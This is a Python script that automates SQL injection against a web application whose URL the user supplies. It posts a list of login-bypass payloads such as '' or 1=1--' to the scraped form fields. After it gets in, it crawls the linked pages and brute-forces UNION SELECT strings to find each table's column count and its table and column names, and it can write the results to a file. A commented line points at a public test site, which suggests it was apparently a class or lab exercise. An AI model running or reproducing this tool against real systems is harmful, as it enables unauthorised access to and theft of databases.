import requests
import itertools
from itertools import product
import urllib.request as urllib2
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from collections import Counter
import re
import operator
import time
import sys

possible_links = []
# all common comment strings used in sql
comments = ["--", "#", "/*"]


def find_input(url, typ):
    names = []
    submit = []
    # if scraping from a url instead of a session
    if(typ == "url"):
        f = urllib2.urlopen(url)
        html = f.read()
        f.close()
        soup = BeautifulSoup(html, "html.parser")
    # if scraping from a logged in session
    if(typ == "session"):
        soup = BeautifulSoup(url.content, "html.parser")
    # all post requets are inside of forms so we need to get all names from forms
    forms_extracted = soup.find_all('form')
    print("================================================================")
    if(typ == "url"):
        print("Inputs on page " + url)
    if(typ == "session"):
        print("Inputs on page " + url.url)
    print("================================================================")
    count = 1
    for f in forms_extracted:
        # within each form find all the inputs
        inputs_extracted = f.find_all('input')
        count = count + 1
        for i in inputs_extracted:
            try:
                # for the sake of this project we are ignoring search fields check boxes and hidden fields
                # get submit inputs
                if(i['type'] == "submit" and i['type'] != "hidden" and i['type'] != "checkbox"):
                    submit.append((i['name'], i['value']))
                    print("TYPE SUBMIT|| Name: " +
                          i['name'] + "  value: " + i['value'])
                # get regular non submit inputs
                else:
                    if(i['name'].lower().find("search") == -1 and i['type'] != "hidden" and i['type'] != "checkbox"):
                        names.append(i['name'])
                        print("TYPE INPUT FIELD|| Name: "+i['name'])
            except:
                pass
    print("================================================================")
    print("\n")
    return names, submit


def scrape(response, domain):
    # use beatiful soup to scrape all links after login
    soup = BeautifulSoup(response.content, "html.parser")
    # grab all a tags which are links
    tag_extracted = soup.find_all('a', href=True)
    regex = re.compile('^http')
    for t in tag_extracted:
        # these are links that do not go offsite
        if regex.match(t['href']) is None:
            link = t['href']
            pattern1 = re.compile("^\.\.")
            pattern2 = re.compile("^//")
            if (pattern1.match(link) == None) and (pattern2.match(link) == None):
                possible_links.append(domain+link)


def login(url, session, user_input):
    # scrape the page for all input fields and submit buttons
    names, submit = find_input(url, "url")
    # this is the list of possible sql injections for loging in
    sql_username_pass = ["admin' --", "admin' #", "admin'/*", "' or 1=1--",
                         "' or 1=1#", "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--", "xxx') OR 1 = 1 -- ]"]
    # if the page does not specify you have to use an email as username
    if(user_input == "none"):
        # just make cartesian product of the list above with 2 elements and use it as username and passwords
        user_pass = product(sql_username_pass, repeat=2)
    # if the page says you have to use an email just pair an email with all the items in the list above as passwords
    else:
        user_pass = []
        for up in sql_username_pass:
            user_pass.append(("example@example.com", up))
    for x in user_pass:
        # prepare post payload dictionary
        # if there is no submit then just use the username and password fields
        if(submit == []):
            dic = {}
            count = 0
            for name in names:
                dic[name] = x[count]
                count = count + 1
        # if there is a submit button add it to the dictionary
        else:
            dic = {}
            count = 0
            for name in names:
                dic[name] = x[count]
                count = count + 1
            dic[submit[0][0]] = submit[0][1]
        # post attack payload to session
        r = session.post(url, dic)
        # logged in
        # if page redirects that means you have logged in and the history shows a redirect
        if(len(r.history) > 0):
            return x[0], x[1], r
    # if you could not log in then return none
    return None, None, None


def find_table_column_length(url, session, names, submit, min, max, acceptable_inputs):
    with open("table.txt") as words:
        for word in words:
            for x in range(min, max+1):
                for comment in comments:
                    # make a list of ones within range specified for brute force attack
                    ones = ["1"]*x
                    ones_global = ",".join(ones)
                    test_str = (
                        " union select " + ones_global + " from " + word.rstrip('\n') + comment)
                    # prepare post dictionary with names and attack string
                    dic = {}
                    n = 0
                    for name in names:
                        dic[name] = acceptable_inputs[n] + test_str
                        n = n + 1
                    # if there is a submit button add submit to attack dictionary
                    if (len(submit) > 0):
                        dic[submit[0][0]] = submit[0][1]
                    # post attack payload dick to specified url
                    response = session.post(url, dic)
                    # if status code = 200 it means the brute force attack has worked and dumped tables
                    # if status code is 500 it means the attack failed and caused an error
                    if(response.status_code == 200):
                        worked = word.lower().rstrip('\n')
                        # done looking for length of columns in table being attacked
                        col_num = x
                        # re-assign global ones list to the one that is working with the number of table columns
                        return col_num, ones_global, comment
                # go back to original page if page redirected to 500 error page to be able to test new table names
                session.get(url)


def find_tables(url, session, names, submit, min, max, acceptable_inputs):
    print("================================================================")
    print("Finding table names using list provided")
    print("================================================================")
    worked = []
    col_num, ones_global, comment = find_table_column_length(
        url, session, names, submit, min, max, acceptable_inputs)
    i = 0
    with open("table.txt") as words:
        for word in words:
            # this start of code for a loading graphic
            i = i + 1
            time.sleep(0.1)
            sys.stdout.write(
                "\r" + "Brute forcing table name " + str(i) + "/40")
            sys.stdout.flush()
            # end loading graphic

            # after number of table columns was found append to test string and use to test with the rest of the table names
            test_str = (
                " union select " + ones_global + " from " + word.rstrip('\n') + comment)
            dic = {}
            # prepare post dictionary with names and attack string
            n = 0
            for name in names:
                dic[name] = acceptable_inputs[n] + test_str
                n = n + 1
            # if there is a submit button add submit to attack dictionary
            if (len(submit) > 0):
                dic[submit[0][0]] = submit[0][1]
            # post attack payload dick to specified url
            response = session.post(url, dic)
            # if status code = 200 it means the brute force attack has worked and dumped tables
            # if status code is 500 it means the attack failed and caused an error
            if(response.status_code == 200):
                worked.append(word.lower().rstrip('\n'))
            # go back to original page if page redirected to 500 error page to be able to test new table names
            session.get(url)
    # return a set of the list of words to make sure there are no repeating ones
    worked = list(set(worked))
    n = 1
    print("\n")
    print("There are " + str(col_num) +
          " columns in the table on the page")
    print("The comment syntax is " + comment)
    n = 0
    for name in names:
        print("Attack string for field name " + name + " is: " + acceptable_inputs[n] + " union select " +
              ones_global + " from " + "[table name]" + comment)
        n = n + 1
    print("\n")
    for table_name in worked:
        print("[" + str(n) + "]" + table_name)
        n = n + 1
    print("================================================================")
    return worked


def find_columns(url, session, names, submit, tables, acceptable_inputs):
    print("\n")
    print("================================================================")
    print("finding column names using list provided")
    print("================================================================")
    worked = {}
    # go through all the possible tables to list their column names
    for table in tables:
        fields = []
        i = 0
        with open("column.txt") as columns:
            # go through all possible brute force column names
            for column in columns:
                i = i + 1
                time.sleep(0.1)
                sys.stdout.write(
                    "\r" + "Brute forcing column name " + str(i) + "/40 for table " + table.rstrip('\n'))
                sys.stdout.flush()
                # test string payload for brute force
                test_str = (
                    " union select " + column.rstrip('\n') + ",1,1,1 from " + table.rstrip('\n') + "--")
                # preparing dictionary for post request attack
                dic = {}
                n = 0
                for name in names:
                    dic[name] = acceptable_inputs[n] + test_str
                    n = n + 1
                if (len(submit) > 0):
                    dic[submit[0][0]] = submit[0][1]
                # post to session using url specified and dictionary of attack payload for the fields
                response = session.post(url, dic)
                # if the page does not throw and error it means the column name is valid and it worked
                if(response.status_code == 200):
                    fields.append(column.lower().rstrip('\n'))
                # go back to original page if page redirected to 500 error page to be able to test new column names
                session.get(url)
        fields = list(set(fields))
        worked[table] = fields
        print("\n")
    for key, value in worked.items():
        print(key + ": " + ", ".join(value))
    print("================================================================")
    return worked


def inject(url, session, response):
    # get page field names
    names, submit = find_input(response, "session")
    acceptable_inputs = []
    for name in names:
        acceptable_input = input(
            "what is an acceptable input for field " + name + ": ")
        acceptable_inputs.append(acceptable_input)
    # find tables on page
    tables = find_tables(url, session, names, submit, 1, 10, acceptable_inputs)
    # find columns in those tables
    columns = find_columns(url, session, names, submit,
                           tables, acceptable_inputs)
    return tables, columns


#url = "http://demo.testfire.net/bank/login.aspx"
url = input("Which site to sql inject into (provide login page link): ")
find_domain = url.rfind("/")
domain = url[:find_domain] + "/"
with requests.Session() as session:
    user_input = input(
        "Does site require email as username? enter yes or none: ")
    username, password, response = login(url, session, user_input)
    if(username != None and password != None):
        print("LOGGED IN!")
        print("username: " + username)
        print("password: " + password)
        scrape(response, domain)
        possible_links = list(set(possible_links))
        visiting = True
        while visiting:
            print("\nAll visible links after login: ")
            count = 1
            for l in possible_links:
                print("[" + str(count) + "]"+l)
                count = count + 1
            link = input("\nwhich link to visit enter number or none: ")
            if(link == "none"):
                visiting = False
            else:
                visit_link = possible_links[(int(link)-1)]
                response = session.get(visit_link)
                table_names, column_names = inject(
                    visit_link, session, response)

                # write discoverys to file
                to_file = input(
                    "write to file? input file name + .txt or none: ")
                if (to_file != "none"):
                    with open(to_file, 'w') as f:
                        f.write(
                            "%s\n" % "================================================================")
                        f.write("%s\n" % "Table names")
                        f.write(
                            "%s\n" % "================================================================")

                        for t in table_names:
                            f.write("%s\n" % t)

                        f.write(
                            "%s\n" % "================================================================")
                        f.write("%s\n" % "Column names")
                        f.write(
                            "%s\n" % "================================================================")

                        for key, value in column_names.items():
                            f.write("%s : " % key)
                            f.write("%s\n" % value)
